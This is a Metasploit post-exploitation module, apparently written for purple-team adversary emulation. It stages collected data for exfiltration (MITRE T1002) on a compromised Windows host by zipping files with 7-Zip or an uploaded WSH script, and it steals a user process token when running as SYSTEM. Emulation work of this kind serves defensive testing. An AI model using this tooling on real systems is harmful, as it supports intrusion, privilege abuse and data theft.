##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Data Compressed (T1002) Windows - Purple Team',
        'Description'   => %q{
          Exfiltration:
          An adversary may compress data (e.g., sensitive documents) that is collected prior
          to exfiltration in order to make it portable and minimize the amount of data sent
          over the network. The compression is done separately from the exfiltration channel
          and is performed using a custom program or algorithm, or a more common compression
          library or utility such as 7zip, RAR, ZIP, or zlib.

          This module zips a file or a directory.
          On Windows, it will try to use remote target's 7Zip if found. If not, it falls
          back to its Windows Scripting Host.

          The module will search the user's TEMP directory for the SOURCE filename.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1002' ] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('DESTINATION', [true, 'The destination path', "C:\\t1002w.zip"]),
        OptString.new('SOURCE', [true, 'The directory or file to compress (will create if it does not exist)', "c:\\t1002w.txt"]),
        OptBool.new('CLEANUP', [false, 'Cleanup files after execution', true])
      ])
  end

  def get_program_file_path
    get_env('ProgramFiles')
  end

  def has_7zip?
    file?("#{get_program_file_path}\\7-Zip\\7z.exe")
  end

  def wsh_script(dst, src)
    script_file = File.read(File.join(Msf::Config.data_directory, "post", "zip", "zip.js"))
    src.gsub!("\\", "\\\\\\")
    dst.gsub!("\\", "\\\\\\")
    script_file << "zip(\"#{src}\",\"#{dst}\");".force_encoding("UTF-8")
    script_file
  end

  def find_pid_by_user(username)
    computer_name = get_env('COMPUTERNAME')
    print_status("Searching for PID for #{computer_name}\\\\#{username}")
    session.sys.process.processes.each do |p|
      if p['user'] == "#{computer_name}\\#{username}"
        return p['pid']
      end
    end

    nil
  end

  def steal_token
    current_user = get_env('USERNAME')
    pid = find_pid_by_user(current_user)

    unless pid
      fail_with(Failure::Unknown, "Unable to find a PID for #{current_user} to execute WSH")
    end

    print_status("Stealing token from PID #{pid} for #{current_user}")
    begin
      session.sys.config.steal_token(pid)
    rescue Rex::Post::Meterpreter::RequestError => e
      # It could raise an exception even when the token is successfully stolen,
      # so we will just log the exception and move on.
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end

    @token_stolen = true
  end

  def upload_exec_wsh_script_zip
    if is_system?
      unless session
        print_error('Unable to compress with WSH technique without Meterpreter')
        return
      end

      steal_token
    end

    script = wsh_script(datastore['DESTINATION'], datastore['SOURCE'])
    tmp_path = "C:\\zip.js"
    write_file(tmp_path, script.encode("UTF-16LE"))

    if datastore['CLEANUP']
      register_files_for_cleanup(tmp_path)
    end

    print_status("script file uploaded to #{tmp_path}")
    cmd_exec("cscript.exe #{tmp_path}")
  end

  def do_7zip
    program_file_path = get_program_file_path
    output = cmd_exec("#{program_file_path}\\7-Zip\\7z.exe a -tzip \"#{datastore['DESTINATION']}\" \"#{datastore['SOURCE']}\"")
    vprint_line(output)
  end

  def do_zip
    output = cmd_exec("zip -D -q -r #{datastore['DESTINATION']} #{datastore['SOURCE']}")
    vprint_line(output)
  end

  def windows_zip
    if has_7zip?
      print_status("Compressing #{datastore['DESTINATION']} via 7zip")
      do_7zip
    else
      print_status("Compressing #{datastore['DESTINATION']} via WSH")
      upload_exec_wsh_script_zip
    end
  end

  def cleanup
    if @token_stolen && session
      session.sys.config.revert_to_self
      print_status('Token restored.')
    end

    super
  end

  def run
    @token_stolen = false

    begin
      filepath = "C:\\t1002w.txt"
      write_file(filepath, 'testing')

      if datastore['CLEANUP']
        register_files_for_cleanup(filepath)
      end

      windows_zip
      dest = datastore['DESTINATION']
      if file?(datastore['DESTINATION'])
        print_good("Module T1002 execution successful.")

        if datastore['CLEANUP']
          register_files_for_cleanup(datastore['DESTINATION'])
        end
      else
        print_error("Couldn't find compressed file, unsuccessful.")
        print_error("Module T1002W execution failed.")
      end
    end
    rescue ::Exception => e
      print_error(e.message)
      print_error("Module T1002W execution failed.")
      return 0
  end
end
